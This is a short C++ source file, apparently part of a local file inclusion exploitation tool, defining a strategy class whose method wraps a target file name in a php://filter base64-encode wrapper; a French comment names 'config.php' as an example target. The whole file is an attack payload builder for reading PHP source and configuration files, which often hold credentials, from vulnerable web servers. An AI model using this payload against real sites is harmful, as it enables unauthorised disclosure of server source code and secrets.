#include "StrategyPhpFilter.hpp"
using namespace std;

StrategyPhpFilter::StrategyPhpFilter()
{

}

string StrategyPhpFilter::preparePayload(string str)
{
	//str devra être le fichier attendu par exemple: 'config.php'
	return "php://filter/read=convert.base64-encode/resource="+str;
}
